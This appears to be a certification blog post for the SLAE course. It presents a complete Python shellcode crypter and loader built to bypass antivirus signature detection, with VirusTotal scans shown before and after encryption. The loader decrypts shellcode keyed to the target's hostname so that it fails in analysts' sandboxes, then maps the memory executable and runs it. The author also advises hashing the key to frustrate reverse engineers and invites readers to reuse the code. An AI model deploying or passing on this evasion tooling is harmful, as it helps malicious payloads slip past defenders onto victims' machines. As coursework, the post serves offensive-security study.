# SLAE Exam Assignment 7 - Creating a custom shellcode crypter

## Prologue
After an absolutely amazing journey that was the x86 Assembly Language and Shellcoding on Linux course brought to us by our instructor Vivek Ramachandran and Pentester Academy, this is the last but definetely not the least enjoyable assignment that we had to do for our SLAE certification i.e. create a custom shellcode crypter that will allow us to bypass AV/EDR signatures.

For this assignment, we could use any programming language of our choice and I chose **Python3**(Hey! why not?) simply beacause it's a breeze to create prototypes in Python before finally implementing it in some language like C/C++. 

So what are we waiting for? Let's get down with it!

## But let's talk about encryption first!
So a question might pop in your heads that is why do we use encryption in the context of payloads, malwares yada yada yada?

All existing malware detection products rely on some form of _static-analysis_ which is basically extracting some signatures from an unknown executable and comparing it to a huge database of known signatures of "bad" programs to determine it's nature before it is ever run on the machine.

To better understand it, let's look at something.

![VirusTotal Scan](../assets/images/vt_scan.png "VirusTotal Scan")

So this is how a standard meterpreter shell looks without any form of encryption when scanned with different AV products. Nearly all AVs possess the ability to catch and quarantine them almost immediately. Hmmmm...

But what if we encrypt the PE/ELF executable? And run the executable by decrypting it successfully at run-time?

The main theme here is to encrypt the payload ahead of time and insert a piece of code called the stub inside the payload that will do the decryption at runtime and execute our payload thereby bypassing static signature-based detection successfully because the AV engine can't crack the encrypted payload pre-execution.

It's a brilliant idea right? Kudos to whoever thought of that!

This is how an encrypted payload looks exposed to VirusTotal.

![VirusTotal Scan Clean](../assets/images/vt_scan_clean.png "VirusTotal Scan Clean")

An **important point** to note is that using this technique we will only be able to bypass AVs relying on _static-analysis_ solely which is seldom the case nowadays since security products today use a hybrid technique of _static-analysis_ and _dynamic-analysis_ combined which is basically automatic execution of the binary in a sandboxed environment and looking for suspicious behaviours/indicators to determine whether it is malicious or not and this going to catch our payload once we decrypt the payload.

Of course there are workarounds for this too but those are the topics of another discussion.

## Implementation details
So we are going to be using a cryptographic library known as NaCl which is an abbreviation for "Networking and Cryptography library" as the principal encryption library for our crypter.

Fortunately for us, since this library was created by a very well-known mathematician and cryptographer known as D.J. Bernstein, we do not need to worry about the security or the mathematical backend of this library and we can move on directly with the practical aspects of it.

Moreover, Nacl takes much of the overhead of the process of encryption and authentication in an effort to make it as smooth and painless and error-free as possible through the use of something known as `Secret Box`.

NaCl uses the following algorithms for symmetric encryption and authentication respectively:

1. Salsa20
1. Poly1305

We are going to be using a Python module known as `PyNaCl` to use this library in Python for this assignment and it can be installed via `pip`.

There's not much to explain about the encryption/decryption process since it's pretty self-explanatory and the developers of this Python module have done a got job explaining it and creating a wonderfully detailed documentation.
Have a look at it [here](https://pynacl.readthedocs.io/en/stable/).

Also my code is beautifully commented to clear any doubts that might arise ;)

### Environmental Keying for shellcode security
One last thing I want to mention before we jump into the code is a feature that I am quite proud of.

So instead of using an encryption passphrase from the user and hardcoding that same passphrase in the stub to decrypt the shellcode at run-time what I have done is known as ***environmental keying*** or in other words hardcoding a host/network-specific target identifier which is available during the creation of the payload and at run-time as the passphrase.

Suppose I am targeting a company, I would first do my recce and find out the hostname used by the machine in their network. Next, I am going to encrypt my shellcode using that hostname as the passphrase and then begin delivery of the payload.
At runtime, the stub dynamically retrieves the hostname of the computer it is being executed upon and tries to decrypt the shellcode using that hostname as the passphrase.

The benefits of doing this are that if the current environment is the intended target for the shellcode only then the shellcode would execute otherwise for any unauthorised target the decryption and ultimately execution would fail. 

This is crucial because you as a red-teamer obviously do not want your shellcode to execute on a blue-teamer/AVs automated malware analysis environment where it will determine it's true nature by running the code in a sandboxed-environment first.

Keep in mind that I have used the hostname here as an example only and in real-life there can be other host/network-specific identifiers that an operator might use as an environmental keying factor to identify the target.

On a side-note, this feature could be trivial to identify should this reach the hands of a blue-team which would then point to a highly-targeted attack. To counter that, A possible improvement upon this would be to use the hashed value of the target identifier as the passphrase to make the life of the reverse-engineers a lot more frustrating ;)

## Crypter Code
The shellcode crypter code is as follows:

```python
# Filename: shellcode_crypter.py
# Author: Upayan a.k.a. slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: This is a Python3 script to encrypt a shellcode using a target hostname
# which alongwith the shellcode hex string is fed into the program and it spits out
# an encrypted shellcode encrypted for the target environment.
# Usage: python3 shellcode_crypter.py
# Note: PyNaCl library has been used for encryption. Also note that the 
# hostname is used as a passphrase to encrypt the shellcode.
# Testing: python3 shellcode_decrypter_loader.py


import socket
import nacl.secret
import nacl.utils
import nacl.pwhash
import base64


salt = b"\xb5\xbe\x95\x7fL\x84%\xd70\xbb\xe7\x19]\xf8\x9cT" # Generate a random 16 bytes salt


def main():
    # Display author
    print("Author: Upayan a.k.a slaeryan\n")
    # Display purpose
    print("Purpose: This is a Python3 script to encrypt a shellcode using a target hostname which alongwith the shellcode is fed into the program and it spits out an encrypted shellcode encrypted for the target environment.\n")
    # Obtain the passphrase
    hostname = input("[+] Enter the target hostname: ")
    print("\n")
    passphrase = hostname.encode("utf-8")
    # Key Derivation Function
    kdf = nacl.pwhash.argon2i.kdf
    # Generate the key
    key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
    # Input the plaintext from the user
    plaintext = input("[+] Enter the Original Shellcode hex string: ")
    # Create a SecretBox for encryption
    box = nacl.secret.SecretBox(key)
    # Encode the plaintext for encryption
    plaintext_byte = plaintext.encode("utf-8")
    # Encrypt the plaintext message
    ciphertext_byte = box.encrypt(plaintext_byte)
    # Cipher text will be 40 bytes longer than plaintext - MAC + Nonce
    assert len(ciphertext_byte) == len(plaintext_byte) + box.NONCE_SIZE + box.MACBYTES
    # Decode the cipher text for display
    ciphertext = base64.b64encode(ciphertext_byte).decode("utf-8")
    # Display the cipher text
    print("\n")
    print("[+] Encrypted Shellcode: ", ciphertext)
    print("\n")


main()
```

## Decrypter Code
The shellcode decrypter/loader code is as follows:

```python
# Filename: shellcode_decrypter.py
# Author: Upayan a.k.a. slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: This is a Python3 script to decrypt an encrypted shellcode which is 
# fed into the program by the user and it executes the shellcode iff it was encrypted
# for the target environment(hostname).
# Usage: python3 shellcode_decrypter_loader.py
# Note: PyNaCl library has been used for decryption. Also note that the 
# hostname is used as a passphrase to decrypt the shellcode and execute it.


import socket
import nacl.secret
import nacl.utils
import nacl.pwhash
import base64
import sys
from ctypes import *


salt = b"\xb5\xbe\x95\x7fL\x84%\xd70\xbb\xe7\x19]\xf8\x9cT" # Use the same salt as used for encryption


def main():
    # Display author
    print("Author: Upayan a.k.a slaeryan\n")
    # Display purpose
    print("Purpose: This Python3 script is used to decrypt a shellcode using PyNaCl library using the encrypted shellcode which is fed as input   and the current hostname is fetched as passphrase and then executes the shellcode iff it was encrypted for the target environment.\n")
    # Obtain the passphrase
    hostname = socket.gethostname()
    passphrase = hostname.encode("utf-8")
    # Key Derivation Function
    kdf = nacl.pwhash.argon2i.kdf
    # Generate the key
    key = kdf(nacl.secret.SecretBox.KEY_SIZE, passphrase, salt)
    # Input the cipher text from the user
    ciphertext = input("[+] Enter the Encrypted Shellcode: ")
    # Encode the cipher text for decryption
    ciphertext_byte = base64.b64decode(ciphertext)
    # Create a SecretBox for decryption
    box = nacl.secret.SecretBox(key)
    # Try to decrypt the cipher text
    try:
        plaintext_byte = box.decrypt(ciphertext_byte)
    except:
        print("\n")
        print("[-] Decryption failed! Shellcode not meant for target environment!\n")
        sys.exit(0)
    # Decode the plaintext message for operations
    plaintext = plaintext_byte.decode("utf-8")
    # Display the plain text
    print("\n")
    print("[+] Original Shellcode: ", plaintext)
    print("\n")
    # Executing the shellcode now
    shellcode = bytes.fromhex(plaintext)
    libC = CDLL('libc.so.6')
    code = c_char_p(shellcode)
    sizeofshellcode = len(shellcode)
    memAddrPointer = c_void_p(libC.valloc(sizeofshellcode))
    codeMovePointer = memmove(memAddrPointer, code, sizeofshellcode)
    protectMemory = libC.mprotect(memAddrPointer, sizeofshellcode, 7)
    run = cast(memAddrPointer, CFUNCTYPE(c_void_p))
    print('[+] Now executing shellcode ...')
    run()


main()
```

## A working demo of the Shellcode Crypter

<script id="asciicast-v8euV3Jy1a15grqy1O9Q5h42x" src="https://asciinema.org/a/v8euV3Jy1a15grqy1O9Q5h42x.js" async></script>

## Code links:
All the code referred to or used in this project is listed as follows:

1. [shellcode_crypter.py](https://github.com/upayansaha/SLAE-Code-Repository/blob/master/Assignment%207/shellcode_crypter.py)
1. [shellcode_decrypter.py](https://github.com/upayansaha/SLAE-Code-Repository/blob/master/Assignment%207/shellcode_decrypter.py)

Feel free to use and modify all of the above code as and when you see fit. 

Cheers!

## Acknowledgements:
What a lovely journey this has been! All thanks to Vivek Ramachandran and Pentester Acacdemy for bringing such a wonderfully brilliant course and that too at an affordable price like this. I still can't comprehend that it's over! 

SLAE is one of the first courses that I had the pleasure of attempting and I hope to persue my OSCP after this alongwith a bunch of other OFFSEC courses offered by Pentester Academy but one thing I can be sure of is that this course will forever be a turning point in my career.

Also, a shoutout to the people who have attempted this course before me for you have given me an inspiration and a map towards the right direction.

To all reading this post who are looking to venture into the OFFSEC grounds I'll tell you this:

_Give SLAE a shot for I can assure that thou shant be disappointed!_

## Note
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

<br />

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](https://www.pentesteracademy.com/course?id=3)

<br />

Student ID: SLAE-1525
